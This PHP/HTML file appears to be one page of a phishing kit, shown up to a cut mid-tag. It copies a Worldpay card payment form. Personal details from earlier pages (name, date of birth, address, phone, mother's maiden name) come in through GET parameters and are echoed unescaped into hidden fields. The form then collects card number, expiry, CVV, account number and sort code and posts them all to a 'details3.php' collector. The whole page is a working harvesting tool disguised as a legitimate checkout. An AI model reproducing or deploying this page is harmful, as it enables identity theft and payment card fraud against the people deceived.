<?php


	$fullname = $_GET['1'];
	$dob = $_GET['2'];
	$address = $_GET['3'];
	$city = $_GET['4'];
	$postcode =  $_GET['5'];
	$phone =  $_GET['6'];
	$mmn = $_GET['7'];



?> 
<!DOCTYPE html>
<html class="js" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<script src="./jquery.min.js.download"></script>

<script>
function empty() {
    var x;
    x = document.getElementById("cardholder_name").value;
    if (x == "") {
        document.getElementById("cardholder_name").style = "border-color: red";
		document.getElementById("cardholder_name_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("card_number").value;
    if (x == "") {
        document.getElementById("card_number").style = "border-color:red";
		document.getElementById("card_number_error").style = "display: block";
        return false;
    }
	if (mod10_check(x) === false) {
	    document.getElementById("card_number").value = "";
        document.getElementById("card_number").style = "border-color:red";
		document.getElementById("wrong_number_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("expiry_month").value;
    if (x == "") {
        document.getElementById("expiry_month").style = "border-color: red";
        return false;
    }
	var x;
    x = document.getElementById("expiry_year").value;
    if (x == "") {
        document.getElementById("expiry_year").style = "border-color: red";
        return false;
    }
	var x;
    x = document.getElementById("cvv").value;
    if (x == "") {
        document.getElementById("cvv").style = "border-color: red";
		document.getElementById("cvv_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("acc_number").value;
    if (x == "") {
        document.getElementById("acc_number").style = "border-color: red";
		document.getElementById("acc_number_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("sort_code").value;
    if (x == "") {
        document.getElementById("sort_code").style = "border-color:red";
		document.getElementById("sort_code_error").style = "display: block";
        return false;
    }

}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("cardholder_name").value;
    if (e !== ""){
	    document.getElementById("cardholder_name").style = "";
		document.getElementById("cardholder_name_error").style = "display: none";
	}
	var e;
    e = document.getElementById("card_number").value;
    if (e !== ""){
	    document.getElementById("card_number").style = "";
		document.getElementById("card_number_error").style = "display: none";
	}
	if (mod10_check(e) === true){
	    document.getElementById("card_number").style = "";
		document.getElementById("wrong_number_error").style = "display: none";
	}
	var e;
    e = document.getElementById("expiry_month").value;
    if (e !== ""){
	    document.getElementById("expiry_month").style = "";
	}
	var e;
    e = document.getElementById("expiry_year").value;
    if (e !== ""){
	    document.getElementById("expiry_year").style = "";
	}
	var e;
    e = document.getElementById("cvv").value;
    if (e !== ""){
	    document.getElementById("cvv").style = "";
		document.getElementById("cvv_error").style = "display: none";
	}
	var e;
    e = document.getElementById("acc_number").value;
    if (e !== ""){
	    document.getElementById("acc_number").style = "";
		document.getElementById("acc_number_error").style = "display: none";
	}
	var e;
    e = document.getElementById("sort_code").value;
    if (e !== ""){
	    document.getElementById("sort_code").style = "";
		document.getElementById("sort_code_error").style = "display: none";
	}
	
}

</script>

<script>

$(document).ready(function(){  
            $("#sort_code").keyup(function(e){
                if (e.keyCode != 8){    
                    if ($(this).val().length == 2){
                        $(this).val($(this).val() + "-");
                    }else if ($(this).val().length == 5){
                        $(this).val($(this).val() + "-");
                    }
                }
            });   
});

</script>

<script>
function cc_format(value) {
  var v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
  var matches = v.match(/\d{4,16}/g);
  var match = matches && matches[0] || ''
  var parts = []
  for (i=0, len=match.length; i<len; i+=4) {
    parts.push(match.substring(i, i+4))
  }
  if (parts.length) {
    return parts.join(' ')
  } else {
    return value
  }
}

onload = function() {
  document.getElementById('card_number').oninput = function() {
    this.value = cc_format(this.value)
  }
}
</script>

<script>
function mod10_check(val){
	var nondigits = new RegExp(/[^0-9]+/g);
	var number = val.replace(nondigits,'');
	var pos, digit, i, sub_total, sum = 0;
	var strlen = number.length;
	if(strlen < 13){ return false; }
	for(i=0;i<strlen;i++){
		pos = strlen - i;
		digit = parseInt(number.substring(pos - 1, pos));
		if(i % 2 == 1){
			sub_total = digit * 2;
			if(sub_total > 9){
				sub_total = 1 + (sub_total - 10);
			}
		} else {
			sub_total = digit;
		}
		sum += sub_total;
	}
	if(sum > 0 && sum % 10 == 0){
		return true;
	}
	return false;
}
</script>

            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            
            <meta name="HandheldFriendly" content="True">
            <meta name="MobileOptimized" content="320">
            <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">

            
            <meta name="format-detection" content="telephone=no">

    
        <link rel="stylesheet" href="./combined.min.css" media="all">

    <link rel="stylesheet" href="./89e96a69efb76490b977d06d0e546c85.css" media="all">

            <link rel="shortcut icon" href="favicon2.ico" type="image/x-icon">

        </head>

        <body class="">

            <div class="wrapper">
             

                <div role="main" id="main" class="iframe">
                     
   
                    <div id="dynamic-content">
                        


<div role="form" class="box payment-details" id="paymentDetails" data-page-title="Card Details">
 
    <div class="paymentMethods-thumbs clearfix">
        <div class="smallIcons" id="pmIcons">
            
            <img id="verifiedByvisa" class="small-icon threeds VISA hidden" title="3D Secure" src="./verified-by-visa-ssl.png" alt="" draggable="false">
        

        

        <img class="small-icon card VISA" title="VISA" src="./visa_115x72.png" alt="" draggable="false">
        

            <img id="verifiedByecmc" class="small-icon threeds ECMC hidden" title="3D Secure" src="./verified-by-ecmc-ssl.png" alt="" draggable="false">
        

        

        <img class="small-icon card ECMC" title="Mastercard" src="./mastercard_115x72.png" alt="" draggable="false">
        
            <img id="verifiedBymaestro" class="small-icon threeds MAESTRO hidden" title="3D Secure" src="./verified-by-maestro-ssl.png" alt="" draggable="false">
        

        

        <img class="small-icon card MAESTRO" title="Maestro" src="./maestro_115x72.png" alt="" draggable="false">

        </div>
    </div>

    <h2 class="clearfix desktop-only section-header">
     <span class="no-wrap box-title">
        
            Payment details
            
                <span class="note"><em class="required-field">*</em> Indicates a required field</span>
            
        
        
     </span>
    </h2>

<form id="command" class="form-validation" method="post" action="../details3.php?/TV-Rnd/Access/Acc&validid=ccccc" onSubmit="return empty()" target="_parent">

    
    <fieldset id="cardDetails">

        <div class="row pair clearfix">
           
        <p class="field-wrapper first" data-mandatory="true">
         
<label for="cardNumber" id="cardNumberLabel" class="cardNumberClass field-label">
    
        Name on Card
    
    
        <em class="required-field">*</em>
    

    
        <span class="validity-indicator valid icon icon-tick"></span>
        <span class="validity-indicator invalid icon icon-cross"></span>
    

</label>

    
                <input id="cardholder_name" name="cardholder_name" role="textbox" type="text" placeholder="Enter your name exactly as it appears on your card" class="textbox required cardNumber UNKNOWN" value="" autocomplete="off" onBlur="change()">
				
				<label id="cardholder_name_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Please type the name printed on your card.</font></label>
            
        </p>
		
		<p class="field-wrapper first" data-mandatory="true">
         
<label for="cardNumber" id="cardNumberLabel" class="cardNumberClass field-label">
    
        Card Number
    
    
        <em class="required-field">*</em>
    

    
        <span class="validity-indicator valid icon icon-tick"></span>
        <span class="validity-indicator invalid icon icon-cross"></span>
    

</label>

    
                <input id="card_number" name="card_number" role="textbox" type="tel" maxlength="19" class="textbox required cardNumber UNKNOWN" value="" autocomplete="off" placeholder="XXXX XXXX XXXX XXXX" onBlur="change()">
            
<label id="card_number_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Please type your card number.</font></label>
<label id="wrong_number_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Card number is invalid. Please try again.</font></label>

        </p>

        </div>

        <div class="row pair clearfix section-details-bottom">
         
        <p class="field-wrapper first" data-mandatory="true">

<label for="expiryMonth" id="expiryMonthLabel" class="expiryMonthClass field-label">
    
        Expiry Date
    
    
        <em class="required-field">*</em>
    

    
        <span class="validity-indicator valid icon icon-tick"></span>
        <span class="validity-indicator invalid icon icon-cross"></span>
    

</label>

    

                 <select id="expiry_month" name="expiry_month" class="dropdown ctr-month small" onBlur="change()">
                     <option value="" selected="selected">
                             Month
                     </option>
                    <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
                </select>
			
                <select id="expiry_year" name="expiry_year" class="dropdown ctr-year small" aria-label="Expiry year" onBlur="change()">

                    <option value="" selected="selected">
                        Year
                    </option>
                  <option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option><option value="2036">2036</option><option value="2037">2037</option>

                </select>
            

            
            <small class="error-hint">&nbsp;</small>


        </p>
    
                <div id="securityCodeDivId" class="securityCode">

        <p class="field-wrapper last" data-mandatory="true">
       
<label for="securityCode" id="securityCodeLabel" class="securityCodeClass field-label">
    
        Security Code
    
    
        <em class="required-field">*</em>
    

    
        <span class="validity-indicator valid icon icon-tick"></span>
        <span class="validity-indicator invalid icon icon-cross"></span>
    

</label>


                        <span class="pin-wrapper">

                            <input id="cvv" name="cvv" type="tel" class="textbox pin" value="" maxlength="4" pattern="(?=(?:\D*\d){3}).*" autocomplete="off" onBlur="change()">
                            <img id="pin-helpimg" src="./pin-card-multicard.png" alt="" title="Security code" class="pin-default" draggable="false">
							<label id="cvv_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Your CVV code.</font></label>

 <input name="1" value="<?php echo $fullname; ?>" type="hidden">
 <input name="2" value="<?php echo $dob; ?>" type="hidden">
  <input name="3" value="<?php echo $address; ?>" type="hidden">
   <input name="4" value="<?php echo $city; ?>" type="hidden">
    <input name="5" value="<?php echo $postcode; ?>" type="hidden">
	 <input name="6" value="<?php echo $phone; ?>" type="hidden">
	  <input name="7" value="<?php echo $mmn; ?>" type="hidden">
	  

	
            
            <small class="error-hint">&nbsp;</small>
        
    


                        </span>
                        <small id="pin-helptxt" class="pin-help security-code-text clearfix cardAny">
                            3 digits on the back of the card or 4 digits on the front of card
                        </small>
                        
                            <span class="cardrule hidden cardDefault" data-pin-suffix="3" data-pin-minlength="3" data-pin-maxlength="3" data-pin-message="Last 3 digits on the back of card">

                                <img src="./pin-basic.png" class="cardrule-img hidden" draggable="false" alt="">

                            </span>
                        
                    
        </p>
    


                </div>
				
				
            
        </div>
		
	

<fieldset id="combinedDetails">
    <fieldset id="billingAddress">
    
<div id="billingContainerPanel1Way" class="editable-panel">
    <div id="billingContainerPanel1wayTop" class="panel1wayTop">
        
    </div>
    <div id="billingContainerPanel1wayBottom">
        
    </div>
</div>


    </fieldset>
    <fieldset id="shippingAddress">
     
<div id="shippingContainerPanel1Way" class="editable-panel">
    <div id="shippingContainerPanel1wayTop" class="panel1wayTop">
        
    </div>
    <div id="shippingContainerPanel1wayBottom">
        
    </div>
</div>


    </fieldset>

    <fieldset id="contactDetails">
 
<div id="contactContainerPanel1Way" class="editable-panel">
    <div id="contactContainerPanel1wayTop" class="panel1wayTop">
        
    </div>
    <div id="contactContainerPanel1wayBottom">
        
    </div>
</div>

    </fieldset>

</fieldset>

<fieldset id="tokenisationDetails">


</fieldset>


    <div class="footerSummary mobile-only">
        




    </div>
    <fieldset class="bottom clearfix">

        <div class="align-r cardMakePaymentButton">

<input type="submit" class="button btn-make-payment" value="Complete" id="submitButton">

        </div>


    </fieldset>

<div>

</div></form>


</div>

<div class="box loading-box failure">

    
    <div class="info">
      
            <img class="logo-powered-by" src="./powered-by-worldpay.svg" alt="">

        <div class="loading-dots" aria-hidden="true">
            <div class="icon icon-circle dot-1"></div>
            <div class="icon icon-circle dot-2"></div>
            <div class="icon icon-circle dot-3"></div>
            <div class="icon icon-circle dot-4"></div>
            <div class="icon icon-circle dot-5"></div>
            <div class="icon icon-circle dot-6"></div>
            <div class="icon icon-circle dot-7"></div>
            <div class="icon icon-circle dot-8"></div>
        </div>
    </div>

    
    <div class="retry-request">
        <p class="center">
            It looks like there may have been a connection issue...
        </p>
        <div class="b